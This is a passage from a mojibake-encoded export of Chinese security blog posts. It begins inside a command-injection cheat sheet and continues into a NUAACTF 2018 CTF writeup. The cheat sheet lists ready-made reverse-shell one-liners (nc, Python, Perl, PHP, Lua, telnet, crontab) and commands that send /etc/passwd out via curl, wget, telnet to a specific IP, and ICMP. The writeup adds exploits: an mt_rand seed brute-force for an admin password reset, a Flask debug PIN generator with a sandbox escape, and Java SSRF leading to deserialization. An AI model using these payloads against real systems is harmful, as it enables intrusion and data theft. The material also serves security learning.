\u0026gt;/tmp/f æˆ–è€…\nmknod backpipe p \u0026amp;\u0026amp; nc ip port 0\u0026lt;backpipe | /bin/bash 1\u0026gt;backpipe æˆ–è€…\n/bin/sh | nc å—å®³è€…ip port\t#è¿™ä¸ªæ¯”è¾ƒç‰¹æ®Š,éœ€è¦åœ¨ä½ è‡ªå·±çš„æœºå™¨ä¸Šè¿è¡Œ pythonæ–¹å¼\npython -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026#34;ip\u0026#34;,port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\u0026#34;/bin/sh\u0026#34;,\u0026#34;-i\u0026#34;]);\u0026#39; å¦ä¸€ç§\npython -c \u0026#34;exec(\\\u0026#34;import socket, subprocess;s = socket.socket();s.connect((\u0026#39;ip\u0026#39;,port))\\nwhile 1: proc = subprocess.Popen(s.recv(1024), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE);s.send(proc.stdout.read()+proc.stderr.read())\\\u0026#34;)\u0026#34; Perlæ–¹å¼\nperl -e \u0026#39;use Socket;$i=\u0026#34;10.0.0.1\u0026#34;;$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\u0026#34;tcp\u0026#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\u0026#34;\u0026gt;\u0026amp;S\u0026#34;);open(STDOUT,\u0026#34;\u0026gt;\u0026amp;S\u0026#34;);open(STDERR,\u0026#34;\u0026gt;\u0026amp;S\u0026#34;);exec(\u0026#34;/bin/sh -i\u0026#34;);};\u0026#39; phpæ–¹å¼\nphp -r \u0026#39;$sock=fsockopen(\u0026#34;ip\u0026#34;,port);exec(\u0026#34;/bin/sh -i \u0026lt;\u0026amp;3 \u0026gt;\u0026amp;3 2\u0026gt;\u0026amp;3\u0026#34;);\u0026#39; luaæ–¹å¼\nlua -e \u0026#34;require(\u0026#39;socket\u0026#39;);require(\u0026#39;os\u0026#39;);t=socket.tcp();t:connect(\u0026#39;ip\u0026#39;,\u0026#39;port\u0026#39;);os.execute(\u0026#39;/bin/sh -i \u0026lt;\u0026amp;3 \u0026gt;\u0026amp;3 2\u0026gt;\u0026amp;3\u0026#39;);\u0026#34; #éœ€è¦lua socketæ”¯æŒï¼Œä¸”lua5.2+ä¸æ”¯æŒluasocket crontabæ–¹å¼\ncrontab -eç¼–è¾‘å½“å‰ç”¨æˆ·çš„ä»»åŠ¡ï¼Œæˆ–è€…æ˜¯å†™åˆ°è®¡åˆ’ä»»åŠ¡ç›®å½•ï¼Œä¸€èˆ¬æ˜¯ /var/spool/cron/ ç›®å½•ï¼Œubuntuæ˜¯ / var/spool/cron/crontabsã€‚æ–‡ä»¶åä¸ºç”¨æˆ·årootç­‰ã€‚ä¸‹é¢å‘½ä»¤å«ä¹‰æ˜¯æ¯ä¸€åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡åå¼¹shellå‘½ä»¤ã€‚\nSHELL=/bin/bash * * * * * /bin/bash -i \u0026gt;\u0026amp; /dev/tcp/ip/port 0\u0026gt;\u0026amp;1 telnetæ–¹å¼\nmknod backpipe p \u0026amp;\u0026amp; telnet ip port 0\u0026lt;backpipe | /bin/bash 1\u0026gt;backpipe msfæ–¹å¼æœ‰å¾ˆå¤šç§ï¼Œè¿™é‡Œå°±ä¸å†æäº†ã€‚\nTrick æ— ç©ºæ ¼ï¼š\nping -c 4 8.8.8.8;hostname|{nc,ip,port} ä½¿ç”¨ncå°†æ–‡ä»¶é‡å®šå‘ï¼š\né¶æœºä¸Š\nnc -lvp port \u0026lt; /etc/passwd æœ¬æœºç›´æ¥nc ip portå¾—åˆ°æ–‡ä»¶å†…å®¹\nä½¿ç”¨httpåè®®ï¼Œé€šè¿‡curlï¼š\ncurl http://ip:port -F a=@/etc/passwd åŒæ ·å¯ä»¥é€šè¿‡curlä½¿ç”¨ftpåè®®ï¼ŒåŒç†wgetã€telnetå½“ç„¶ä¹Ÿæ˜¯å¯ä»¥çš„\nwget --post-data=\u0026#34;`cat /etc/passwd`\u0026#34; http://ip:port wget --post-file=/etc/passwd http://ip:port telnet 106.14.153.173 2015 \u0026lt; /etc/passwd ä½¿ç”¨ICMPæŠ¥æ–‡\ncat password.txt | xxd -p -c 16 | while read exfil; do ping -p $exfil -c 1 xxx.xxx.xxx.xxx; done æ›´æ­£ 2019/2/13ï¼Œæ›´æ­£äº†æ–‡ç« å‡ å¤„é”™è¯¯ï¼Œå·²æ›´æ–°æ–‡ç« å†…å®¹é”™è¯¯å¤„\n$(printf \u0026#34;\\x63\\x61\\x74\\x20\\x2f\\x66\\x6c\\x61\\x67\u0026#34;)\t#å¯ä»¥æ‰§è¡Œ å‚è€ƒ Web Application Firewall (WAF) Evasion Techniques\nCommand Injection - OWASP\ncoomix\nWeb å®‰å…¨æ¼æ´ä¹‹ OS å‘½ä»¤æ³¨å…¥\nlinuxç‰¹æ®Šç¬¦å·å¤§å…¨\nå°å¯†åœˆä¸“é¢˜(2)-å‘½ä»¤æ‰§è¡Œç»•è¿‡\nlinux bash shellä¸­ï¼Œå•å¼•å·ã€ åŒå¼•å·ï¼Œåå¼•å·ï¼ˆ``ï¼‰çš„åŒºåˆ«åŠå„ç§æ‹¬å·çš„åŒºåˆ«\nç”±ISCC2018-Web-Pingå­¦ä¹ å‘½ä»¤æ³¨å…¥\nshelling\nHITCON CTF 2017-BabyFirst Revenge-writeup\nLINUXä¸‹åå¼¹SHELLçš„ç§ç§æ–¹å¼\nLinuxæ¸—é€ä¹‹åå¼¹Shellå‘½ä»¤è§£æ\næŠ€æœ¯åˆ†æï¼šæ”»å‡»è€…æ˜¯å¦‚ä½•åˆ©ç”¨ç³»ç»Ÿå‘½ä»¤ç›²æ³¨å®ç°â€œæ‹–åº“â€çš„ï¼Ÿ\n","date":"2019-01-17T18:55:27Z","permalink":"https://blog.zeddyu.info/2019/01/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/","title":"å·§ç”¨å‘½ä»¤æ³¨å…¥çš„Nç§æ–¹å¼"},{"content":"NUAACTF 2018 writeup\n[TOC]\nWeb Web1 Asuri-Information-System é¢˜ç›®æè¿° http://ctf.asuri.org:8001 å¬è¯´æœ‰äº”ä¸ªå¾ˆå‰å®³çš„äººï¼Œä¸€ä¸ªæ˜¯admin,ä¸€ä¸ªæ˜¯admin1,ä¸€ä¸ªæ˜¯admin2,ä¸€ä¸ªæ˜¯admin3,ä¸€ä¸ªæ˜¯admin4ã€‚å¬è¯´æ‰“è´¥ä»–ä»¬å…¶ä¸­ä¸€ä¸ªå°±å¯ä»¥æ‹¿åˆ°flagå•¦ flagæ ¼å¼ä¸ºNUAACTF{.*} ä¿¡æ¯æ”¶é›† æ ¹æ®é¢˜ç›®æè¿°ï¼Œæˆ‘ä»¬è¦åšçš„è‚¯å®šå°±æ˜¯è¦å»ç™»å½•admin[1-4] || adminäº†ã€‚\né¦–å…ˆè¿›å…¥é¢˜ç›®ç•Œé¢ï¼Œå‘ç°é¢˜ç›®åŠŸèƒ½å¾ˆç®€å•ï¼Œé¦–é¡µåªæä¾›æ³¨å†Œç™»å½•ä¸¤ä¸ªåŠŸèƒ½ã€‚\n \n \næˆ‘ä»¬å…ˆéšä¾¿ç™»å½•æ³¨å†Œä¸€ä¸‹ï¼Œè¿›å»åå‘ç°æœ‰ä¸ªé‡ç½®å¯†ç çš„åŠŸèƒ½ã€‚\n \n \né‡ç½®ä¸€ä¸‹æŠ“åŒ…çœ‹çœ‹ã€‚\n \nç„¶åçœŸçš„å‘ç°è‡ªå·±é‚®ç®±é‡Œé¢å¤šäº†ä¸€å°é‡ç½®å¯†ç çš„é‚®ä»¶ã€‚\n \næ‰«ç›®å½•å¯ä»¥å¾—åˆ°www.zipï¼Œå‘ç°é¢˜ç›®çš„æ‰€æœ‰åŸºæœ¬æºç ã€‚\n \næ€è·¯ åŸºæœ¬çš„ä¿¡æ¯å¦‚ä¸Šï¼Œç„¶åæˆ‘ä»¬å¯ä»¥æ ¹æ®å·²æœ‰ä¿¡æ¯æ¥çœ‹ï¼Œä»é‚£ä¸ªé‡ç½®å¯†ç è¯·æ±‚åŒ…æ¥çœ‹ï¼Œè²Œä¼¼æˆ‘ä»¬å¯ä»¥æ§åˆ¶é‡ç½®ç”¨æˆ·çš„ç”¨æˆ·åã€‚é‚£æˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥é‡ç½®amdinçš„å¯†ç ï¼Œé€šè¿‡ä»€ä¹ˆæ–¹å¼ç™»å½•ä¸Šå‘¢ï¼Œè€Œä¸”é‚£ä¸ªè¯·æ±‚åŒ…è¿˜æœ‰å›æ˜¾äº†ä¸€ä¸ªintä¹Ÿæ¯”è¾ƒå¥‡æ€ªï¼Œçœ‹èµ·æ¥åƒæ˜¯var_dump()å‡ºæ¥çš„æ•°æ®ã€‚\né€šè¿‡å¤§æ¦‚çš„ä»£ç å®¡è®¡ï¼Œé¢˜ç›®ç”¨äº†åœ¨sqlè¯­å¥çš„åœ°æ–¹é¢„ç¼–è¯‘ï¼Œæ‰€ä»¥æ²¡ä»€ä¹ˆåŠæ³•æ³¨å…¥å¾—åˆ°admin\næŸ¥çœ‹handleræºç :\n\u0026lt;?php require \u0026quot;./config.php\u0026quot;; require \u0026quot;./email.php\u0026quot;; function generatePasswd(){ mt_srand((double) microtime() * 1000000); var_dump(mt_rand()); return substr(md5(mt_rand()),0,6); } function changePasswd($username, $password){ $password = md5($password); $stmt = $GLOBALS['dbh']-\u0026gt;prepare(\u0026quot;UPDATE users SET password = ? WHERE username = ?\u0026quot;); $stmt-\u0026gt;bind_param('ss', $password, $username); $stmt-\u0026gt;execute(); if ($stmt-\u0026gt;affected_rows === 1){ echo \u0026quot;\u0026lt;script\u0026gt;alert(\\\u0026quot;Success!\\\u0026quot;);history.back(-1);\u0026lt;/script\u0026gt;\u0026quot;; return; } else echo \u0026quot;\u0026lt;script\u0026gt;alert(\\\u0026quot;Error!\\\u0026quot;);history.back(-1);\u0026lt;/script\u0026gt;\u0026quot;; $stmt-\u0026gt;free_result(); $stmt-\u0026gt;close(); } function getEmail($username){ if ($username){ $stmt = $GLOBALS['dbh']-\u0026gt;prepare(\u0026quot;SELECT email From users where username = ?\u0026quot;); $stmt-\u0026gt;bind_param('s', $username); $stmt-\u0026gt;bind_result($email); $stmt-\u0026gt;execute(); if($stmt-\u0026gt;fetch()){ return $email; } else return \u0026quot;error!\u0026quot;; $stmt-\u0026gt;free_result(); $stmt-\u0026gt;close(); } else{ return \u0026quot;error!\u0026quot;; } } $username = isset($_POST['username']) ? trim($_POST['username']) : NULL; $email = getEmail($username); if ($email == \u0026quot;error!\u0026quot;){ echo \u0026quot;Error!\u0026quot;; die(); } $passwd = generatePasswd(); if(sendMail($email,$passwd)){ changePasswd($username,$passwd); } else{ echo \u0026quot;\u0026lt;script\u0026gt;alert(\\\u0026quot;Error! Check your Email address plz!\\\u0026quot;);history.back(-1);\u0026lt;/script\u0026gt;\u0026quot;; } ?\u0026gt; \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026quot;UTF-8\u0026quot;\u0026gt; \u0026lt;title\u0026gt;Asuri-Team Managment System\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;/body\u0026gt; é€šè¿‡ä»£ç å®¡è®¡ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¼ å…¥çš„usernameåˆ°äº†getEmailè¿™ä¸ªå‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°ç”¨äº†é¢„ç¼–è¯‘ï¼Œæ‰€ä»¥æˆ‘ä»¬æ²¡ä»€ä¹ˆåŠæ³•æ³¨å…¥ã€‚è¿™ä¸ªå‡½æ•°å°±æ˜¯æ ¹æ®usernameè¿”å›å¯¹åº”emailï¼Œé€šè¿‡generatePasswd()äº§ç”Ÿéšæœºå¯†ç ï¼Œé€šè¿‡sendMail()å‘é€å¯†ç åˆ°é‚®ç®±ï¼Œæœ€åç”¨changePasswd()æ¥ä¿®æ”¹æ•°æ®åº“ä¸­çš„å¯†ç ã€‚\næ•´ä¸ªé€»è¾‘åŸºæœ¬æ¸…æ¥šäº†ï¼Œæ‰€ä»¥æˆ‘ä»¬æ˜¯å¯ä»¥é€šè¿‡ä¼ å…¥ä¸€ä¸ªusername=adminæ¥é‡ç½®ç®¡ç†å‘˜çš„å¯†ç ã€‚ä½†æ˜¯æ€ä¹ˆç™»å½•æˆadminå‘¢ï¼Œæˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥é€šè¿‡çˆ†ç ´éšæœºå¯†ç æˆ–è€…ç ´è§£éšæœºå¯†ç æ¥ç™»å½•å‘¢ã€‚\næˆ‘ä»¬é‡ç‚¹çœ‹çœ‹generatePasswd()\nfunction generatePasswd(){ mt_srand((double) microtime() * 1000000); var_dump(mt_rand()); return substr(md5(mt_rand()),0,6); } æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œé¡µé¢ä¸Šçš„int(2055522123)å³æ˜¯var_dump(mt_rand());çš„æ˜¾ç¤ºç»“æœã€‚\nå¯ä»¥çœ‹çœ‹\nvoid mt_srand ([ int $seed ] ) ç”¨ seed æ¥ç»™éšæœºæ•°å‘ç”Ÿå™¨æ’­ç§ã€‚ æ²¡æœ‰è®¾å®š seed å‚æ•°æ—¶ï¼Œä¼šè¢«è®¾ä¸ºéšæ—¶æ•°ã€‚ Note: è‡ª PHP 4.2.0 èµ·ï¼Œä¸å†éœ€è¦ç”¨ srand() æˆ– mt_srand() ç»™éšæœºæ•°å‘ç”Ÿå™¨æ’­ç§ ï¼Œå› ä¸ºç°åœ¨æ˜¯ç”±ç³»ç»Ÿè‡ªåŠ¨å®Œæˆçš„ã€‚ ç„¶åéšæœºæ•°ç§å­æ˜¯(double) microtime() * 1000000\nmixed microtime ([ bool $get_as_float ] ) microtime() å½“å‰ Unix æ—¶é—´æˆ³ä»¥åŠå¾®ç§’æ•°ã€‚æœ¬å‡½æ•°ä»…åœ¨æ”¯æŒ gettimeofday() ç³»ç»Ÿè°ƒç”¨çš„æ“ä½œç³»ç»Ÿä¸‹å¯ç”¨ã€‚ å¦‚æœè°ƒç”¨æ—¶ä¸å¸¦å¯é€‰å‚æ•°ï¼Œæœ¬å‡½æ•°ä»¥ \u0026#34;msec sec\u0026#34; çš„æ ¼å¼è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå…¶ä¸­ sec æ˜¯è‡ª Unix çºªå…ƒï¼ˆ0:00:00 January 1, 1970 GMTï¼‰èµ·åˆ°ç°åœ¨çš„ç§’æ•°ï¼Œmsec æ˜¯å¾®ç§’éƒ¨åˆ†ã€‚å­—ç¬¦ä¸²çš„ä¸¤éƒ¨åˆ†éƒ½æ˜¯ä»¥ç§’ä¸ºå•ä½è¿”å›çš„ã€‚ å¦‚æœç»™å‡ºäº† get_as_float å‚æ•°å¹¶ä¸”å…¶å€¼ç­‰ä»·äº TRUEï¼Œmicrotime() å°†è¿”å›ä¸€ä¸ªæµ®ç‚¹æ•°ã€‚ Note: get_as_float å‚æ•°æ˜¯ PHP 5.0.0 æ–°åŠ çš„ã€‚ æ‰€ä»¥è¿™é‡Œmicrotime() * 1000000æ˜¯ä¸è¶…è¿‡7ä½æ•°çš„ï¼Œè€Œä¸”ç¬¬ä¸€æ¬¡éšæœºæ•°æˆ‘ä»¬å·²ç»å¾—åˆ°äº†ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡çˆ†ç ´éšæœºæ•°ç§å­æ¥å¾—åˆ°éšæœºæ•°ã€‚\nè´´ä¸€ä¸ªè‡ªå·±å†™çš„php exp\n\u0026lt;?php // echo ((double) microtime() * 1000000).\u0026#34;\\n\u0026#34;; // mt_srand((double) microtime() * 1000000); // var_dump(mt_rand()); // echo substr(md5(mt_rand()),0,6);  // int(1409622410) // bc700b  $seed = 0; for($i = 0;$i \u0026lt; 1000000; $i++){ mt_srand($i); $str = mt_rand(); if($str === 1796651235){ $seed = $i; } } echo $seed.\u0026#34;\\n\u0026#34;; mt_srand($seed); mt_rand(); echo substr(md5(mt_rand()),0,6); çŒœè§£å¾—åˆ°å¯†ç ç™»å½•å°±å¯ä»¥å¾—åˆ°flag\n \nè¿™é‡Œé¿å…ç»™å¤§å®¶ç«äº‰éšæœºâ€¦å°±ç»™äº†5ä¸ªamdinï¼Œå…¶å®åº”è¯¥æ³¨å†Œä¸€ä¸ªå°±å¯¹åº”ç»™ä¸€ä¸ªadminï¼Œä½†æ˜¯æ„Ÿè§‰5ä¸ªåº”è¯¥å·®ä¸å¤šäº†\u0026hellip;\nWeb2 ç”·èˆªç†å·¥å¤§å­¦é€‰è¯¾ç³»ç»Ÿ é¢˜ç›®æè¿° http://ctf.asuri.org:8003 å°ç«æ±ï¼Œå¬è¯´ä½ æƒ³é€‰è¯¾ï¼Ÿ flagæ ¼å¼ä¸ºNUAACTF{.*} ä¿¡æ¯æ”¶é›† é¢˜ç›®è®¾ç½®éå¸¸ç®€å•\n \n \nå°±ä¸€ä¸ªç™»å½•æ³¨å†Œç•Œé¢ã€‚ç„¶åç»™äº†ä¸€ä¸ªwww.zipçš„é™„ä»¶ï¼Œæ”¾å‡ºäº†å…³é”®æºç ã€‚\nç„¶åï¼Œéšä¾¿ç‚¹ä¸€ä¸ªé€‰è¯¾ï¼Œå°±æŠ¥é”™äº†ã€‚\n \nå†çœ‹çœ‹æºç ï¼Œå…¶ä¸­åœ¨user.pyä¸­å‘ç°\n@users.route(\u0026#39;/asserts/\u0026lt;path:path\u0026gt;\u0026#39;) def static_handler(path): filename = os.path.join(app.root_path,\u0026#39;asserts\u0026#39;,path) if os.path.isfile(filename): return send_file(filename) else: abort(404) è§£é¢˜ è¿™ä¸ªé¢˜ç†Ÿæ‚‰flaskçš„ä¼šå‘ç°ï¼Œé‚£ä¸ªæŠ¥é”™é¡µé¢å…¶å®å°±æ˜¯å¼€å¯äº†debugçš„ç•Œé¢ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨pinç æ¥è®¤è¯debugç•Œé¢è¿›è¡Œå‘½ä»¤æ‰§è¡Œã€‚\nè€Œå…³äºpinç ï¼Œæˆ‘çœ‹èµ›æ—¶å¾ˆå¤šé˜Ÿä¼éƒ½é‡‡å–çˆ†ç ´çš„æ–¹å¼ï¼Œå¯¼è‡´è¾“å…¥è¿‡å¤šï¼Œå°±ä¸èƒ½å†è¾“å…¥äº†ã€‚å°±å¯¼è‡´æˆ‘èµ›æ—¶åªèƒ½äººè‚‰è¿ç»´é‡ç½®web2ã€‚\nmd5_list = [ 'root', #å½“å‰ç”¨æˆ·ï¼Œå¯é€šè¿‡è¯»å–/etc/passwdè·å– 'flask.app', #ä¸€èˆ¬æƒ…å†µä¸ºå›ºå®šå€¼ 'Flask', #ä¸€èˆ¬æƒ…å†µä¸ºå›ºå®šå€¼ '/usr/local/lib/python2.7/dist-packages/flask/app.pyc', #å¯é€šè¿‡debugé”™è¯¯é¡µé¢è·å– '2485377892354', #macåœ°å€çš„åè¿›åˆ¶ï¼Œé€šè¿‡è¯»å–/sys/class/net/eth0/addressè·å–macåœ°å€ å¦‚æœä¸æ˜¯æ˜ å°„ç«¯å£ å¯ä»¥é€šè¿‡arp ipå‘½ä»¤è·å– '0c5b39a3-bba2-472c-a43d-8e013b2874e8' #æœºå™¨åï¼Œé€šè¿‡è¯»å–/proc/sys/kernel/random/boot_id æˆ–/etc/machine-idè·å– ] ç”Ÿæˆpinç çš„ä»£ç \ndef get_pin(md5_list): h = hashlib.md5() for bit in md5_list: if not bit: continue if isinstance(bit, unicode): bit = bit.encode(\u0026#39;utf-8\u0026#39;) h.update(bit) h.update(b\u0026#39;cookiesalt\u0026#39;) h.update(b\u0026#39;pinsalt\u0026#39;) num = (\u0026#39;%09d\u0026#39; % int(h.hexdigest(), 16))[:9] for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = \u0026#39;-\u0026#39;.join(num[x:x + group_size].rjust(group_size, \u0026#39;0\u0026#39;) for x in range(0, len(num), group_size)) break else: rv = num return rv æ‹¿åˆ°pinç ä¾¿å¯æ‰§è¡Œå‘½ä»¤ã€‚\nå…·ä½“å¯ä»¥å‚è€ƒFlask debug pinå®‰å…¨é—®é¢˜\nè´´ä¸€ä¸‹è¿™é¢˜å¾—åˆ°çš„exp\nimport hashlib def get_pin(md5_list): h = hashlib.md5() for bit in md5_list: if not bit: continue if isinstance(bit, unicode): bit = bit.encode(\u0026#39;utf-8\u0026#39;) h.update(bit) h.update(b\u0026#39;cookiesalt\u0026#39;) h.update(b\u0026#39;pinsalt\u0026#39;) num = (\u0026#39;%09d\u0026#39; % int(h.hexdigest(), 16))[:9] for group_size in 5, 4, 3: if len(num) % group_size == 0: rv = \u0026#39;-\u0026#39;.join(num[x:x + group_size].rjust(group_size, \u0026#39;0\u0026#39;) for x in range(0, len(num), group_size)) break else: rv = num return rv name = get_name() md5_list = [ \u0026#39;ctf\u0026#39;, \u0026#39;flask.app\u0026#39;, \u0026#39;Flask\u0026#39;, \u0026#39;/usr/local/lib/python2.7/dist-packages/flask/app.pyc\u0026#39;, \u0026#39;2485378285570\u0026#39;, \u0026#39;\u0026#39; ] print get_pin(md5_list) è¿™é‡Œå¯èƒ½æ¯”è¾ƒå‘çš„æ˜¯/usr/local/lib/python2.7/dist-packages/flask/app.pycè·Ÿmachine_idæ˜¯ç©ºä¸¤å¤„ã€‚ä¸è¿‡é€šè¿‡å‡ æ¬¡å°è¯•ä¹Ÿéƒ½å¯ä»¥å°è¯•å‡ºæ¥ã€‚éš¾åº¦å¹¶ä¸ç®—å¤§ã€‚\nç„¶åå°±æ˜¯å‘½ä»¤æ‰§è¡Œï¼Œä¸€ä¸ªç®€å•æ²¡æœ‰ä»»ä½•è¿‡æ»¤çš„Pythonæ²™ç›’ï¼Œæ–¹æ³•å¾ˆå¤šã€‚\nè¿™é‡Œç®€å•ç»™ä¸ªäº‹ä¾‹\n[console ready] \u0026gt;\u0026gt;\u0026gt; ().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][\u0026#39;eval\u0026#39;](\u0026#39;__import__(\u0026#34;os\u0026#34;).popen(\u0026#34;ls\u0026#34;).read()\u0026#39; ) \u0026#39;APP\\nflag\\nrun.py\\ntest.py\\nwww.zip\\n\u0026#39; \u0026gt;\u0026gt;\u0026gt; ().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][\u0026#39;eval\u0026#39;](\u0026#39;__import__(\u0026#34;os\u0026#34;).popen(\u0026#34;cat ./flag\u0026#34;).read()\u0026#39; ) \u0026#39;NUAACTF{F14sssskkkrrr_D3Bug_n0t_S4f3}\u0026#39;  \nWeb3 å¼ å“¥çš„é‡‘ç‰Œä¹‹æ—… é¢˜ç›®æè¿° ä¿¡æ¯æ”¶é›† æ‰“å¼€å‘ç°æ˜¯ä¸ªjavaæ¡†æ¶ã€‚\n \næä¾›äº†ç®€å•çš„ç™»å½•æ³¨å†Œã€‚\nç„¶åå‘ç°åªæœ‰A+Bé—®é¢˜å¯ä»¥ç‚¹\n \n \nä»£ç æäº¤é¡µé¢æä¾›ä»£ç æäº¤ï¼ŒæŸ¥çœ‹æœ€åä¸€æ¬¡æäº¤çš„ä»£ç åŠŸèƒ½ã€‚\n \nå¼•ç”¨ä»£ç æç¤º\nè¯·ä»¥ä»£ç æ–‡ä»¶ä¸ºurlï¼Œä¾‹å¦‚http://mysite.com/main.cï¼Œä»…æ”¯æŒc,cpp,java,py,js,csçš„æäº¤ ç„¶åæäº¤ä¸€ä¸ªhttps://raw.githubusercontent.com/php/php-src/master/ext/zlib/zlib.cï¼Œå‘ç°è¿”å›ä»£ç è¿‡å¤šï¼Œå†æ‰¾ä¸ªå‡ è¡Œä»£ç çš„https://gitee.com/CheungSSH_OSC/CheungSSH/raw/master/bin/DataConf.py\nè¿”å›æç¤ºæˆåŠŸï¼ŒæŸ¥çœ‹ä¸Šä¸€æ¬¡æäº¤ä»£ç ï¼Œå‘ç°ä»¥æºç æ–¹å¼è¿”å›ã€‚è¿˜æœ‰ä¸ªä¸‹è½½ä»£ç çš„åŠŸèƒ½ï¼Œå¾—åˆ°ä¸€ä¸ªæ–‡ä»¶åä¸ºç”¨æˆ·åç»è¿‡md5åçš„txtæ–‡ä»¶ã€‚\næ€è·¯ æ—¢ç„¶å¼•ç”¨ä»£ç å¤„ï¼Œå¯ä»¥å¼•ç”¨httpåè®®çš„urlï¼Œé‚£æˆ‘ä»¬å¯ä»¥è¯•è¯•ç”¨fileå¦‚ä½•ã€‚\n \nå‘ç°æ˜¯forbiddenï¼Œé€šè¿‡fuzzæˆ‘ä»¬å¯ä»¥å¾—åˆ°jar netdocä¸¤ä¸ªjava SSRFæ”¯æŒçš„åè®®æ²¡æœ‰è¢«banï¼Œè€Œä¸”éœ€è¦å†æœ€ååŠ å…¥?1.cæ¥ç»•è¿‡åç¼€æ£€æµ‹\n \nç„¶åæŸ¥çœ‹æœ€åä¸€æ¬¡ä»£ç æäº¤ï¼Œå‘ç°å¹¶æ²¡æœ‰ä»€ä¹ˆæ”¹å˜ã€‚\nè¯•è¯•netdocï¼Œä¼ å…¥netdoc:///?1.c\n \nå‘ç°å¯ä»¥å¾—åˆ°å›æ˜¾\n \nä½†æ˜¯ç›´æ¥è¯·æ±‚flagï¼Œå‘ç°è¢«banæ‰äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬å¾—å¦å¯»ä»–è·¯ã€‚\n \nçªç ´å£ é€šè¿‡æŸ¥çœ‹ä¸€ç³»åˆ—æ–‡ä»¶ï¼Œå‘ç°å¦‚æœç›´æ¥è¯»classæ–‡ä»¶çš„è¯ï¼Œç›´æ¥å±•ç¤ºå‡ºæ¥äº†classäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œé‚£æˆ‘ä»¬ä¸‹è½½ä¸‹æ¥ä¼šä¸ä¼šä¹Ÿæ˜¯classæ–‡ä»¶çš„å½¢å¼å‘¢\n \nä¸‹è½½ä¸‹æ¥åï¼Œæˆ‘ä»¬ç”¨fileçœ‹ä¸€ä¸‹ï¼Œæœç„¶æ˜¯ä¸ªjava classæ–‡ä»¶\n \nç”¨JD-GUIæ‰“å¼€å¾—åˆ°æºç \n \né¢˜ç›®æè¿°è¯´éœ€è¦é€†å‘å¸ˆå‚…å…¶å®æŒ‡çš„å°±æ˜¯è¿™é‡Œéœ€è¦é€†å‘classæ–‡ä»¶ï¼Œï¼ˆå…¶å®ä¹Ÿä¸éœ€è¦â€¦ç›´æ¥ç”¨JD-GUIç›´æ¥å°±èƒ½çœ‹äº†\u0026hellip;\nè¿™é‡Œçœç•¥äº†å…¶ä»–æºç çš„å®¡è®¡ã€‚\nç„¶åçœ‹åˆ°è²Œä¼¼å¤šå‡ºçš„è¿™ä¸ªUser.classç±»ï¼Œç„¶åå‘ç°äº†æ¯”è¾ƒæ•æ„Ÿçš„readObject()å‡½æ•°ï¼Œjavaååºåˆ—åŒ–æ¼æ´ç‰¹å¾ï¼Œå¯èƒ½å­˜åœ¨javaååºåˆ—åŒ–æ¼æ´\n \nç„¶åæ‰¾åˆ°å…¶åˆ©ç”¨çš„åœ°æ–¹ï¼Œå‘ç°åœ¨netdoc:///app/webapps/ROOT/WEB-INF/classes/org/nuaa/tomax/logindemo/controller/UserController.classè°ƒç”¨äº†Userç±»ã€‚\n \nUserController.classçš„å…³é”®éƒ¨åˆ†:\n@PostMapping({\u0026#34;/record\u0026#34;}) public void record(long userId, HttpSession session, String cmd) throws Exception { Timestamp timestamp = new Timestamp(System.currentTimeMillis()); UserEntity user = (UserEntity)session.getAttribute(\u0026#34;user_\u0026#34; + userId); if (cmd != null) { User mUsr = new User(user.getId(), user.getUsername(), cmd, timestamp); SysUtil.recordCmd(mUsr); } } åœ¨çœ‹åˆ°SysUtil.class:\n \n \nå‘ç°ç«Ÿç„¶æœ‰éƒ¨åˆ†è²Œä¼¼çœŸçš„éœ€è¦é€†å‘ï¼Œä½†æ˜¯å…¶å®ä»”ç»†å¾€ä¸‹çœ‹ï¼Œåˆ©ç”¨ç‚¹è·Ÿä¸Šé¢é‚£æ®µä»£ç æ²¡å¤ªå¤§å…³ç³»ã€‚\nçœ‹åˆ°recordCmd()ï¼Œå¯ä»¥è¯´æ˜¯éå¸¸æ ‡å‡†çš„javaååºåˆ—åŒ–çš„ä»£ç äº†ã€‚\npublic static void recordCmd(User user) throws IOException, ClassNotFoundException { FileOutputStream fos = new FileOutputStream(\u0026#34;object\u0026#34;); ObjectOutputStream os = new ObjectOutputStream(fos); os.writeObject(user); os.close(); FileInputStream fis = new FileInputStream(\u0026#34;object\u0026#34;); ObjectInputStream ois = new ObjectInputStream(fis); User outUsr = (User)ois.readObject(); ois.close(); } æ¥ç€æˆ‘ä»¬å›åˆ°User.classï¼Œå¾ˆæ˜æ˜¾ï¼Œè¿™é‡Œå¯ä»¥æ§åˆ¶ä¼ å…¥cmdï¼Œæˆ‘ä»¬å†çœ‹çœ‹User.classçš„å…³é”®ä»£ç :\nprivate static final String[] BLACKLIST = { \u0026#34;$\u0026#34;, \u0026#34;{\u0026#34;, \u0026#34;}\u0026#34;, \u0026#34;`\u0026#34;, \u0026#34;base64\u0026#34;, \u0026#34;\u0026amp;\u0026#34;, \u0026#34;;\u0026#34;, \u0026#34;||\u0026#34;, \u0026#34;%\u0026#34;, \u0026#34;(\u0026#34;, \u0026#34;)\u0026#34;, 